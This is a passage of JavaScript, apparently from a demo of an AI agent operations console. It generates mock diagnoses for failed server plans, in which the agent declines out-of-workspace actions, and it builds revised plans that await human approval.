    runs = [run('ls -la /srv/dev/myapp/.cache', ['lrwxrwxrwx 1 warden warden 14 Oct 18 21:02 /srv/dev/myapp/.cache -> /var/cache/npm']), { cmd: 'stat /var/cache/npm', refused: true, lines: ['refused · path is outside workspace_roots /srv/dev'] }];
    findings = '.cache is a symlink to /var/cache/npm, outside the workspace, so the agent was right to refuse. There’s no way to clear it inside policy, so I’m not proposing a revision. Clear it by hand, or point npm’s cache into /srv/dev.';
  } else if (p.failReason === 'policy_violation') {
    const why = (fs.lines[2] || '').trim() || 'denied by policy';
    runs = [run(`ls -la ${cwd}`, ['total 24', 'drwxr-xr-x 6 warden warden 4096 Oct 20 14:02 .', 'drwxr-xr-x 4 warden warden 4096 Oct 18 09:11 ..', '-rw-r--r-- 1 warden warden  812 Oct 20 13:58 package.json'])];
    findings = `Step ${fs.n} was refused by the agent (${why}). I won’t work around policy.` + (skipped.length ? ' The revision keeps the remaining steps without it.' : ' Nothing is left to do inside policy, so I’m not proposing a revision.');
    if (skipped.length) steps = skipped.map((s, i) => rs(i + 1, s.kind, s.command, s.purpose, s.cwd, s.timeout_s, s.script.length ? s.script : ['ok']));
  } else {
    runs = [run(`ls -la ${cwd}`, ['total 24', 'drwxr-xr-x 6 warden warden 4096 Oct 20 14:02 .', '-rw-r--r-- 1 warden warden  812 Oct 20 13:58 package.json']), run('docker ps', ['CONTAINER ID   IMAGE         STATUS       NAMES', '4f1a9c2e7b30   myapp:1.4.1   Up 2 days    dev-myapp-app-1'])];
    findings = `Step ${fs.n} exited ${fs.exit}. Nothing on the server looks changed by it, so the revision retries from step ${fs.n}.`;
    steps = p.steps.filter(s => s.n >= fs.n).map((s, i) => rs(i + 1, s.kind, s.command, s.purpose, s.cwd, s.timeout_s, ['ok']));
  }
  if (runs.some(r => r.refused) && p.id !== 'pln_01JB6T2Q') findings += ' One read-only command was blocked by policy, so I worked without it.';
  return { runs, findings, steps: steps && steps.length ? steps : null };
}
export function makeRevision(p, steps, now = Date.now()) {
  return { id: 'pln_01JB' + hex(now % 99991).slice(0, 4).toUpperCase(), revises: p.id, changed: steps.length, goal: p.goal, target: p.target, requested_by: p.requested_by, risk: 'low', final: 'allow', status: 'awaiting_approval', created: now, expires: now + 30 * MIN, policy, fromDiagnosis: true,
    gatekeepers: gk('allow', 'Targets the cause of the failure and stays inside the goal.', 'allow', 'Small revision. Nothing outside the goal.'), steps };
}
